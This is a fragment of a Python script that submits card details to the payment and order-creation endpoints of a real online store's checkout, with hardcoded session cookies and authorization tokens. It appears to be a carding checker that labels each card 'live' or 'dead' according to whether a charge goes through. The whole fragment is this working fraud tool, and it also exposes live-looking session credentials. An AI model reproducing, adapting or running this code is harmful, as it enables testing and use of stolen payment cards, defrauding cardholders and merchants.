                # 'cookie': 'svSession=88403f0ba404315559b83ec17d99066da40e15555982ccadb5ade243d62d04696bbb526eb9827b2724f1d4c2b7508ac91e60994d53964e647acf431e4f798bcdf7a7d42786e73a647c13f8073337440f14fd436b22311af4ca407ed277d23da37d755879e6f78f7e05c411f1948fe2b40312217d9290eb60e4e9c366ae6fd83568fa662fe68033e652924feb5954d56f; _fbp=fb.2.1747099757274.783596408139690499; _ga_G7H3ZJ2XD7=GS2.1.s1749250405$o2$g0$t1749250405$j60$l0$h0; _ga=GA1.1.1686304304.1747099758; _ga_LVKNG19EBQ=GS2.1.s1749250405$o2$g1$t1749250888$j60$l0$h0; _hjSessionUser_6502453=eyJpZCI6ImFiYWQwNzg2LWM2YmEtNTljNi05OGE0LTMwMTVlMjA2ZWRlMyIsImNyZWF0ZWQiOjE3NTYzMTQxOTExMzAsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_6502453=eyJpZCI6IjJkZTcxYmZiLTc5OGUtNGU5MS04ODFmLTlhMDZkNWU5NGRhNyIsImMiOjE3NTYzMTQxOTExMzEsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; XSRF-TOKEN=1756314191|mp5IopJRI_d6; hs=1824749638; _ga_24GFQT7WYN=GS2.1.s1756314192$o1$g0$t1756314192$j60$l0$h114681740; bSession=37991cfa-b4d1-4379-8c05-5c408436628a|7',
                'origin': 'https://www.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://www.mimovil.com.mx/checkout?appSectionParams=%7B%22a11y%22%3Atrue%2C%22storeUrl%22%3A%22https%3A%2F%2Fwww.mimovil.com.mx%22%2C%22isPickupFlow%22%3Afalse%2C%22cashierPaymentId%22%3A%22%22%2C%22origin%22%3A%22productPage%22%2C%22originType%22%3A%22buyNow%22%2C%22checkoutId%22%3A%228105187b-50d2-3013-ad22-d13fc9c15148%22%7D',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-wix-brand': 'wix',
                'x-wix-client-artifact-id': 'cashier-payments-widget',
                'x-xsrf-token': '1756314191|mp5IopJRI_d6',
            }

            json_data = {
                'details': {
                    'paymentMethod': 'creditCard',
                    'billingAddress': {},
                    'redirectTarget': 'EMBEDDED',
                    'installments': 1,
                    'card': {
                        'numberToken': token,
                        'securityCodeToken': token_security,
                        'holderName': f'{name} {last}',
                        'expiryMonth': mes,
                        'expiryYear': ano_number,
                    },
                    'buyerInfo': {
                        'buyerId': '956bbfa6-3a56-46f7-9096-1830ab62a1ac',
                        'buyerLanguage': 'es',
                    },
                    'clientInfo': {
                        'deviceFingerprint': '17eaarJ59tEk139c6U81XmkyfmYX6cYJfB',
                    },
                },
            }

            response = c.post(
                'https://www.mimovil.com.mx/_api/payment-services-web/payments/v2/payment-details',
                
                headers=headers,
                json=json_data,
            )

            responsePm = json.loads(response.text)
            details_id = responsePm["detailsId"]
            print(details_id)

            headers = {
                'Accept': 'application/json, text/plain, */*',
                'Referer': 'https://www.mimovil.com.mx/_partials/wix-thunderbolt/dist/clientWorker.df1ff4c9.bundle.min.js',
                'commonConfig': '%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%2237991cfa-b4d1-4379-8c05-5c408436628a%7C11%22%2C%22siteRevision%22%3A%223278%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D',
                'x-wix-brand': 'wix',
                'authorization': 'EU_vv3no7ULofjmt9ucGgw-7Nz3Z7cXR04lyY2_hgug.eyJpbnN0YW5jZUlkIjoiMmIxYTk2ZDgtYTllMi00NDA5LWFmMjEtNmUyZDcxYzJkMzNlIiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiYzRmMzA1ZGMtOGYxNS00MGNlLTlmNDEtOTNlNWZmZjg4NTQ2Iiwic2lnbkRhdGUiOiIyMDI1LTA4LTI3VDE3OjAzOjExLjM3MFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJhaWQiOiI5NTZiYmZhNi0zYTU2LTQ2ZjctOTA5Ni0xODMwYWI2MmExYWMiLCJiaVRva2VuIjoiZWZlOTkzMDQtMjZmNy0wNGM3LTMwNjAtZmRjODhlM2E1Njc4Iiwic2l0ZU93bmVySWQiOiI5MDlhNjdkMS03NmRkLTQ2YjctYjJiYS1kNTNkMWIxNmYyZjYiLCJzY2QiOiIyMDI0LTAxLTI0VDIyOjM0OjU2LjUwMFoifQ',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
            }

            json_data = {
                'query': 'mutation createOrderAndCharge($input: EcomCheckoutV1CreateOrderAndChargeRequestInput!) {\n  checkoutMutation: ecomCheckoutV1CreateOrderAndCharge(input: $input) {\n    orderId\n    subscriptionId\n    paymentResponseToken\n    paymentGatewayOrderId\n    checkoutCompleted\n  }\n}',
                'variables': {
                    'input': {
                        'id': checkout_id,
                        'paymentToken': details_id,
                        'savePaymentMethod': False,
                        'delayCapture': False,
                        'urlParams': {
                            'errorUrl': 'https://www.mimovil.com.mx/checkout?appSectionParams=%7B%22a11y%22%3Atrue%2C%22storeUrl%22%3A%22https%3A%2F%2Fwww.mimovil.com.mx%22%2C%22isPickupFlow%22%3Afalse%2C%22cashierPaymentId%22%3A%22%22%2C%22origin%22%3A%22productPage%22%2C%22originType%22%3A%22buyNow%22%2C%22checkoutId%22%3A%2238718b52-5a62-3a78-8e09-6ad93866be07%22%7D&redirect=error',
                            'cancelUrl': 'https://www.mimovil.com.mx/checkout?appSectionParams=%7B%22a11y%22%3Atrue%2C%22storeUrl%22%3A%22https%3A%2F%2Fwww.mimovil.com.mx%22%2C%22isPickupFlow%22%3Afalse%2C%22cashierPaymentId%22%3A%22%22%2C%22origin%22%3A%22productPage%22%2C%22originType%22%3A%22buyNow%22%2C%22checkoutId%22%3A%2238718b52-5a62-3a78-8e09-6ad93866be07%22%7D&redirect=cancel',
                            'successUrl': 'https://www.mimovil.com.mx/thank-you-page/{orderId}?appSectionParams=%7B%22objectType%22%3A%22order%22%2C%22origin%22%3A%22checkout%22%7D',
                            'pendingUrl': 'https://www.mimovil.com.mx/thank-you-page/{orderId}?appSectionParams=%7B%22objectType%22%3A%22order%22%2C%22origin%22%3A%22checkout%22%7D',
                        },
                    },
                },
                'operationName': 'createOrderAndCharge',
            }

            response = c.post('https://www.mimovil.com.mx/graphql-server/graphql', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            checkout_data = responsePm.get("data", {}).get("checkoutMutation")

            if checkout_data and checkout_data.get("checkoutCompleted") is True:
                # LIVE
                status = "live"
                mensaje = "Aprobado"
                order_id = checkout_data.get("orderId")  # opcional
            else:
                # DEAD
                status = "dead"
                if "errors" in responsePm:
                    error_message = responsePm["errors"][0].get("message", "Error desconocido")
                    mensaje = f"Tarjeta rechazada: {error_message}"
                else:
                    mensaje = "Tarjeta rechazada"

            return {"status": status, "message": mensaje, "cc": card}


        except Exception as e:
            print(e)
            retry_count += 1
    else:

        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}




